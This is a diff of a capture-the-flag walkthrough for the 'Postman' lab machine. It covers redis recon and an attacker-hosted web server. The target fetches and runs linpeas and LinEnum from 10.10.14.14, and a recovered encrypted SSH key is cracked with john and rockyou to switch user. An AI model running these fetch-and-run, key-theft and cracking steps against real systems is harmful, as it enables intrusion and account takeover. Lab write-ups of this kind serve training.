@@ -17,15 +17,16 @@ Required tools
 * john
 * metasploit
 
-Other tools
-* redis-cli
-* exiftool https://exiftool.org
-* gobuster https://github.com/OJ/gobuster
-
-Other commands
+Other commands/tools
 ```
+redis-cli
+gobuster
 find . -writable -ls
 find . -readable -ls
+# lists files between dates
+find / -newermt YYYY-MM-DD ! -newermt YYYY-MM-DD -ls 2>/dev/null
+exiftool
+stat
 strings
 ```
 
@@ -56,6 +57,9 @@ PORT      STATE SERVICE VERSION
 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
 |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# redis
+nmap --script redis-info -p 6379 10.10.10.160
 ```
 
 Verify open ports
@@ -102,24 +106,24 @@ ssh -o StrictHostKeyChecking=no -i ~/.ssh/postman redis@10.10.10.160
 
 ### Lateral Movement
 
-Upload privesc scripts from lab
+Upload privesc scripts
 ```bash
-# save <LAB_IP_ADDRESS> from tun0
-ifconfig
+# get <IP_ADDRESS>
+ifconfig tun0 | grep inet | awk 'FNR == 1 {print $2}'
 
-mkdir -p /share/postman/www
+mkdir -p /share/www
 
 # expose single file
-cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh /share/postman/www
-cp /opt/LinEnum/LinEnum.sh /share/postman/www
+curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+curl -sS -L -o /share/www/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
 # run static server
-python -m http.server -d /share/postman/www
+python3 -m http.server -d /share/www
 
 # download scripts
-ssh -i /share/postman/keys/postman redis@10.10.10.160
+ssh -o StrictHostKeyChecking=no -i ~/.ssh/postman redis@10.10.10.160
 cd /dev/shm
-# <LAB_IP_ADDRESS>
+# use <IP_ADDRESS>
 wget 10.10.14.14:8000/linpeas.sh
 bash linpeas.sh
 wget 10.10.14.14:8000/LinEnum.sh
@@ -127,8 +131,8 @@ bash LinEnum.sh
 ```
 
 Output of privesc scripts
-```
-[-] Location and Permissions (if accessible) of .bak file(s):
+```bash
+# readable encrypted private key
 -rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
 ```
 
@@ -140,18 +144,25 @@ cat /opt/id_rsa.bak
 #Proc-Type: 4,ENCRYPTED
 #DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
 
-# copy to root@lab
-mkdir -p /share/postman/john
-vim /share/postman/john/postman.ssh
+# copy locally
+vim /share/postman.ssh
 
 # convert to compatible format
-ssh2john.py /share/postman/john/postman.ssh > /share/postman/john/postman.ssh.john
+find / -name "*ssh2john*" 2>/dev/null
+# old
+python3 /usr/share/john/ssh2john.py /share/postman.ssh > /share/postman.ssh.john
+# latest (python 3.9)
+curl -sS -L -o /share/ssh2john.py https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
+python3 /share/ssh2john.py /share/postman.ssh > /share/postman.ssh.john
 
 # PWD: computer2008
-john /share/postman/john/postman.ssh.john --wordlist=/usr/share/wordlists/rockyou.txt
+tar xvzf /wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /share
+john /share/postman.ssh.john --wordlist=/share/rockyou.txt
 # user access
 su - Matt
 ```
+
+### Privilege Escalation TODO
 
 Metasploit
 ```bash
